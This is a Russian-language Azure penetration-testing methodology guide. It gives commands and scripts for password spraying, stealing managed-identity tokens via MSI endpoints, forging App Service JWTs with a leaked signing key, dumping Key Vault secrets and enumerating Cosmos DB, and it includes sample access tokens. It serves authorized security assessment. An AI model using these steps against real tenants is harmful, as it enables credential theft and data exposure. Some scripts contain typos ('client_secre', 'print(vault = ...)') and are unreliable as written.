# Azure Portal

Портал представляет собой веб-интерфейс к внутренней инфраструктуре облака. Все приложения, доступные текущему пользователю, будут изображены на главной странице портала. Из страницы “Active Directory” можно узнать имена и email-адреса других пользователей, subscription id, другие приложения, их названия, IP-адреса и эндпоинты. Разведку лучше проводить здесь, т.к. консольный интерфейс неинтуитивен и будет требовать указания крайне громоздких токенов и GUID для работы.

# Azure Active Directory

Для того, чтобы взаимодействовать с AAD, потребуется установить PS модули `Az`, `AzureAD` и `MSOnline`, после чего подключить каждый:

```powershell
Install-Module Az
Install-Module AzureAd
Install-Module MSOnline

Connect-AzAccount
Connect-AzureAD
Connect-MsolService
```

Для разведки можно использовать https://github.com/BloodHoundAD/AzureHound. Из фреймворка https://github.com/NetSPI/MicroBurst можно экспортировать скрипт `Get-AzurePasswords`:

[https://www.netspi.com/blog/technical/cloud-penetration-testing/exporting-azure-runas-certificates/](https://www.netspi.com/blog/technical/cloud-penetration-testing/exporting-azure-runas-certificates/)

В облаке мы можем провести password spray, используя https://github.com/dafthack/MSOLSpray. Чтобы узнать парольную политику, достаточно модуля MSOnline:

```powershell
Connect-MsolService
Get-MsolPasswordPolicy -DomainName pentest.onmicrosoft.com
```

# Container Registry

Для каждого ACR внутри AAD создается пользователь с именем, соответствующим имени registry. Таким образом, компрометация этого пользователя приведет к компрометации registry.

Подробнее:

[Attacking Azure Container Registries with Compromised Credentials](https://www.netspi.com/blog/technical/cloud-penetration-testing/attacking-acrs-with-compromised-credentials/)

Также к ACR можно подключиться если известен access token:

```
docker login myregistry.azurecr.io --username 00000000-0000-0000-0000-000000000000 \
--password $TOKEN
```

Токен может быть отображен в логах при исполнении команды `az acr login -n pentest --expose-token` . Срок действия токена составляет 3 часа. Выглядит он так:

```powershell
{
  "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlZJUkk6S0ZZRToySVZHOlVOU0U6UEFEUTpYU0NQOkpXQU06WkFBRzpPN0FVOkU3NlU6SVBPUDoyNzQ3In0.eyJqdGkiOiIzMGI5YWQ0MS05MWUyLTQxYzctYWI5NC02NDg2ODliMGM3MTAiLCJzdWIiOiJhZDNiZGM1My1hODEwLTRlZjktYTYyOS1kODc4NDUwMjYyMzQiLCJuYmYiOjE2NjI1NDg5ODMsImV4cCI6MTY2MjU2MDY4MywiaWF0IjoxNjYyNTQ4OTgzLCJpc3MiOiJBenVyZSBDb250YWluZXIgUmVnaXN0cnkiLCJhdWQiOiJuYXVkYXBheS5henVyZWNyLmlvIiwidmVyc2lvbiI6IjEuMCIsInJpZCI6Ijk2MzQxOTgwNGRjMDRkODk5MDaiZDY5ODg1NWM1NzllIiwiZ3JhbnRfdHlwZSI6InJlZnJlc2hfdG9rZW4iLCJhcHBpZCI6ImUxYzBiNzRkLTliMDEtNDk0Ny04YzU4LTIyNTU1NzQwZmEyZiIsInRlbmFudCI6IjZhOWQ4MDY5LTI2MzQtNGNmMi1hNTM4LThjYjYxZmM2MGU0YyIsInBlcm1pc3Npb25zIjp7IkFjdGlvbnMiOlsicmVhZCIsIndyaXRlIiwiZGVsZXRlIiwiZGVsZXRlZC7yZWFkIiwiZGVsZXRlZC9yZXN0b3JlL2FjdGlvbiJdLCJOb3RBY3Rpb25zIjpudWxsfSwicm9sZXMiOltdfQ.k2cGP7weul0DZSD-8a05QO7WFpl66-Ftn_fHDexRiKHcdqX_5wBpQZbPVCI60_gCUZOVUkyjArMMu0j-GwUe7u3q2h1ATLuJ6azl4PvJ4U-pcVrA2Xvoqzlhayo7U3K3xorgKmYz49hoPcjswb5Gz1QYZ1AsLIS8pOT8Uj2WxRVV3g0KGmqWCi8z9C5nPpmUGXGHZgETH62fGGB3ziMF-Fgk02beB2OSPPkdqEDr6MRy-CIV2nEBgNezwWs9IE9Q1XZLMONnBBs8iVEJM2RMbdHJiud1LfEw7__U-H5EfBvW5PjlqOys5W87txgEI2XhPpEmr-dS3GTac0-dAQqPnQ"
  "loginServer": "pentest.azurecr.io"
}
```

Как правило, все токены для сервисов Azure начинаются с подстроки `eyJ` , так что по ней можно погрепать.

# Web App Service

Сервис Web App представляет собой облачное веб-приложение, собираемое из контейнера. В качестве платформы могут использоваться как ОС Windows, так и Linux. К приложению могут быть привязаны несколько внешних IP-адресов на portal.azure.com. Кроме того, существуют несколько поддоменов специального назначения, например, `https://<servicename>.scm.azurewebsites.net`, `https://<servicename>.azurewebsites.net`, `https://<servicename>.b2clogin.com`.

### Веб-консоли

Для легкости администрирования к веб-приложению Azure доступны два веб-шелла из [portal.azure.com](http://portal.azure.com/): Kudu и WebSSH.

Kudu представляет собой chroot-среду, из которой не будет доступа к реальным сетевым интерфейсам, пользователям и процессам машины, однако, через него будет доступна часть файловой системы запущенного приложения и актуальные переменные среды. В файловой системе необходимо исследовать логи в корне и рабочую директорию на предмет наличия данных для латера. В левой нижней части интерфейса можно будет скопировать пароль для Kudu в открытом виде и затем проверить его переиспользование в других сервисах.

Kudu будет доступен по URL-адресу `https://<имясервиса>.scm.azurewebsites.net/DebugConsole`

WebSSH предоставляет полный доступ к машине, в которой запущено приложение. Для того, чтобы получить к ему доступ, необходимо иметь имя этого инстанса и поместить это значение в cookie `ARRAffinity`:

![https://codez.deedx.cz/images/how-to-ssh-into-web-app-instance/image-20210203122041737.png](https://codez.deedx.cz/images/how-to-ssh-into-web-app-instance/image-20210203122041737.png)

WebSSH будет доступен по URL-адресу `https://<имясервиса>.azurewebsites.net/webssh/host`.

Даже если доступ к консоли на первый взгляд не представляет ничего интересного, следует держать в уме, что многие атаки будут ограничены правилами фаерволла, поэтому проксирование трафика через машину с доверенным адресом может спасти ситуацию.

### Переменные среды

Данные в переменных совершенно точно пригодятся для латера. Здесь можно найти connection string для File Storage, ключ подписи для JWT и MSI_ENDPOINT.

Connection string используется для подключения к файловым хранилищам, при чем для этого не нужно аутентифицироваться посредством az-cli. Если правила МЭ это допускают, то это будет все, что необходимо для того, чтобы подключиться ко внутренним ресурсам из внешней сети. Для подключения нам потребуется установить Azure Storage Exlplorer.

В переменной среды будет написан пользователь, от которого осуществляется подключение и ключ, закодированный в base64. Из него будет необходимо сформировать connection string как на рисунке

![2023-01-23_12-43.png](pics/storage-explorer.png)

У этих данных нет единого названия для переменной, кроме того, ее может не быть - ключ также может быть указан напрямую в `/etc/fstab`.

В случае если переменная среды `WEBSITE_AUTH_ENABLED` установлена как true, это значит, что приложение использует JWT-токен в заголовке `X-ZUMO-AUTH` для аутентификации. Это значит, что мы можем использовать `WEBSITE_AUTH_SIGNING_KEY` для подделки токенов.

[Azure App Service Authentication in an ASP.NET Core Application](https://shellmonger.wordpress.com/2017/03/02/azure-app-service-authentication-in-an-asp-net-core-application/)

Если переменные `MSI_ENDPOINT` и `MSI_SECRET` (вариант - `IDENTITY_ENDPOINT` и `IDENTITY_HEADER`) доступны для вывода в SSH-консоли (в Kudu вы получите уведомление, что к ним нет доступа), следует получить management token и vault token. Используя их, вы сможете подключиться к Key Vault и сдампить оттуда всю критичную информацию. 

```bash
mgmt_res="https://management.core.windows.net/.default"
vault_res="https://vault.azure.net/.default"
# вариант с MSI
curl "$MSI_ENDPOINT?resource=$mgmt_res" -H secret:$MSI_SECRET
# вариант с IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=$mgmt_res" -H X-IDENTITY-HEADER:$IDENTITY_HEADER
```

В случае успеха вы получите что-то вроде

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzZhOWQ4MDY5LTI2MzQtNGNmMi1hNTM4LThjYjYxZmM2MGU0Yy8iLCJpYXQiOjE2NzE0MzgzODEsIm5iZiI6MTY3MTQzODM4MSwiZXhwIjoxNjcxNDQyMjgxLCJhaW8iOiJFMlpnWUpCdWZ2dEFMZnl2OFNyR2h3dVR2SDAzQUFBPSIsImFwcGlkIjoiYTIxOGI3MTItOTViOS00ZjI0LWFmYzEtZDlhNzg5OGRlZGMwIiwiYXBxaWRhY3IiOiIxIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvNmE5ZDgwNjktMjYzNC00Y2YyLWE1MzgtOGNiNjFmYzYwZTRjisi5Im9pZCI6IjYzNTg1MDVlLThlM2UtNGE0Mi1hZjAyLWExZjU0ZTMzZDExNyIsInJoIjoiMC5BVWdBYVlDZGFqUW04a3lsT0l5Mkg4WU9URG16cU0taWdocEhvOGtQd0w1NlFKTklBQUEuIiwic3ViIjoiNjM1ODUwNWUtOGUzZS00YTQyLWFmMDItYTFmNTRlMzNkMTE3IiwidGlkIjoiNmE5ZDgwNjktMjYzNC00Y2YyLWE1MzgtOGNiNjFmYzYwZTRjIiwidXRpIjoiV2U4SlhZZEhVMGljX1Z2Q2xfdlBBQSIsInZlciI6IjEuMCJ9.nlwtHl4LQD2QNatLhMgY8le_6e8AIr_QRVGft5aBxpaKUDx0Zh-FYQaZ209LD4Q-eC2q1vNpdX4UwDg1jD-IU1t1K5V1dTexVs4Q1kZuZk1HK-Swk-bQmO7M72C4XRQtQLEKyhkuVIDqP3_v9xUWZNR7NKpBv3eOes5dT071k_b-J7C2fTOJlJCzBd82zPlWsAtQ1sJ06-7aZVuH5Xd9Z2S3pnDtRJqYnvqjzPEjdrWRjK2NWkTolqA85iNJM51B8hD0s65VhEkaEtHMK6peIIQkpfHpUw6BHmP9cSWu2eTHWF-KMkeY9HxnXH6VZ1zH-VMXZ1bbUyJA2XFgNaNrhQ
```

### Tenancy

Веб-приложение может быть single-tenancy или multi-tenancy, что означает, что доступ к данному приложению могут получать либо пользователи одного тенанта, либо, в целом, все клиенты Microsoft.

Для того, чтобы проверить, является ли приложение multi-tenancy, администратор может запустить следующую команду:

```bash
az ad app list --filter "(signinaudience eq 'AzureADMultipleOrgs' or
signinaudience eq 'AzureADandPersonalMicrosoftAccount')" --query "[?web && 
web.homePageUrl].{AppName:displayName, AppID:appId, AppURL:web.homePageUrl}" 
```

[Эксплуатация multi-tenancy](https://www.wiz.io/blog/azure-active-directory-bing-misconfiguration?ref=danaepp.com)
### Сетевые службы

Публичные IP-адреса приложения, полученные на портале, необходимо просканировать на предмет наличия недекларированных сервисов. Как правило, будут открыты следующие порты:

![2023-01-05_13-30.png](pics/azure-ports.png)

[https://learn.microsoft.com/en-us/azure/app-service/environment/app-service-app-service-environment-control-inbound-traffic](https://learn.microsoft.com/en-us/azure/app-service/environment/app-service-app-service-environment-control-inbound-traffic)

Порты 4018-4022 по умолчанию закрываются облаком в течении двух суток, однако данное поведение может быть изменено владельцем. Для установления соединения необходимо иметь соответствующую версию Visual Studio. Подключиться к удаленному отладчику можно из любого проекта, открыв в разделе “Свойства” окно “Отладка”:

![2023-01-05_13-37.png](pics/remote-debugger.png)

Для запуска удаленной отладки будет необходимо выбрать отлаживаемый исполняемый файл и ввести адрес сервера. В случае установления соединения будет предложено ввести логин и пароль пользователя из AAD, у которого есть доступ к отладке данного приложения:

![2023-01-05_13-41.png](pics/remote-debugger-2.png)

Аутентификация будет производится при помощи NTLM SSP. 

# File Storage

Если у пользователя в Azure Portal есть доступ к файловому хранилищу, он может получить шелл, создав Cloud Shell для него:

[Azure Privilege Escalation via Cloud Shell](https://www.netspi.com/blog/technical/cloud-penetration-testing/attacking-azure-cloud-shell/)

# Key Vault

Key Vault представляет собой хранилище конфиденциальных данных, которые приложения могут запрашивать, используя токены. Microsoft [рекомендует использовать отдельные Key Vault для каждого приложения](https://learn.microsoft.com/en-us/azure/key-vault/general/best-practices), однако в случае отсутствия сегментации мы будем способны скомпрометировать всю внутреннюю инфраструктуру. Секреты, хранимые в Key Vault, включают в себя пароли для пользователей, сервисов и сессий, SSH-ключи, токены, приватные ключи сертификатов, connection strings.

Для подключения нужен management и vault token, который можно получить, обратившись либо на MSI-эндпоинт, либо используя секретный ключ приложения, которое оно может раскрыть в логах или сорцах. Ниже приведен скрипт для генерации токена из такого ключа.

> ⚠️ Рекомендуется устанавливать модули azure в виртуальной среде, т.к. при установке azure-cli устанавливается урезанная версия библиотеки, где не хватает некоторых функций
> 

```python
from azure.keyvault.secrets import SecretClient
from azure.identity import ClientSecretCredential

tenant_id = None # find in portal
client_id = None # replace
client_secret = None # ...

credential = ClientSecretCredential(
    tenant_id,
    client_id,
    client_secre
)
client = SecretClient(
    'https://pentest.vault.azure.net/',
    credential
)
print(credential.get_token(
    'https://management.core.windows.net/.default'
))
print(vault = credential.get_token(
    'https://vault.azure.net/.default'
))
```

Используя токен, мы можем подключиться к Key Vault, используя Powershell:

```powershell
Connect-AzAccount -AccessToken $mgmt_token -KeyVaultAccesToken $vault_token -AccountId $account_id
# $subscription_id и $account_id проще всего посмотреть в портале
Get-AzKeyVault -SubscriptionId $subscription_id
Get-AzKeyVaultSecret -VaultName $vault
# $name узнаем из вывода команды выше
Get-AzKeyVaultSecret -VaultName $vault -Name $name -AsPlainText
```

### Cosmos DB

Если в инфраструктуре есть эта база, стоит попробовать проэксплуатировать уязвимость [ChaosDB](https://chaosdb.wiz.io/).

Для энума бд можно использовать следующий скрипт:

```python
from azure.cosmos import CosmosClient
from azure.identity import ClientSecretCredential, DefaultAzureCredential
'''
tenant_id = None # find in portal
client_id = None # replace
client_secret = None # ...

# If AAD auth used
credential = ClientSecretCredential(
    tenant_id,
    client_id,
    client_secret
)

aad_credentials = DefaultAzureCredential()
'''
client = CosmosClient(
    'https://<servicename>.documents.azure.com:443/', 
    credential='', # секретная строка из Key Vault
    consistency_level='Session'
)
print(client.list_databases()) # получите имя нужной бд

account = client.get_database_account()
print(account.DatabasesLink)
print(account.MediaLink)
print(account.ReadableLocations)
print(account.WritableLocations)

'''для взаимодействия с бд 
db = client.get_database_client('') # имя вставлять сюда

containers = list(db.list_containers(max_item_count=100))
users = list(db.list_users(max_item_count=100))
print(
   f'Users: {users}\nContainers: {containers}'
)
'''
```

Обратите внимание, что Cosmos - это нерелеационная база данных, и для получения чего-либо оттуда нужно знать имя вызываемой записи, которая устанавливается произвольно разработчиком, взаимодействующим с базой. Конечно, в модуле есть метод получить все записи, однако на продакшене это сделать не удалось и эксперимент был приостановлен во избежание доса.

Если вы знаете, что вы ищете, дальнейшие справки по обращению с базой при помощи Python можно использовать репозиторий [https://github.com/Azure-Samples/azure-cosmos-db-python-getting-started](https://github.com/Azure-Samples/azure-cosmos-db-python-getting-started).

### Service Bus

Service Bus - это служба обмена сообщениями между различными приложениями в облаке (не обязательно все из них находятся в области аудита или принадлежат вашему клиенту). Если в Key Vault был обнаружен connection string для Service Bus, к его сообщениям можно попасть, используя https://github.com/paolosalvatori/ServiceBusExplorer/. Сообщения нужно проинспектировать на предмет наличия конфиденциальных данных, а также, если он используется для общения с другими сервисами, попытаться осуществить инъекцию или переотправить запрос и посмотреть, что будет.

---

**Further reading**

- [Pentesting Azure Applications](https://docs.ahcts.co/Community_Contributions/SmokinSpectre/Pentesting_Books/Pentesting_Azure_Applications.pdf)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md)
- [HackTricks](https://cloud.hacktricks.xyz/pentesting-cloud/azure-pentesting)
- [NETSPI Blog](https://www.netspi.com/blog/technical/cloud-penetration-testing/)
- [Azure AD Methodology](https://github.com/geeksniper/active-directory-pentest#azure)
- [Cloud Security Wiki](https://www.secwiki.cloud/)

**Тулзы**

- https://github.com/NetSPI/MicroBurst
- https://github.com/BloodHoundAD/AzureHound
- https://github.com/dafthack/MSOLSpray
- https://github.com/paolosalvatori/ServiceBusExplorer/
- [Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer)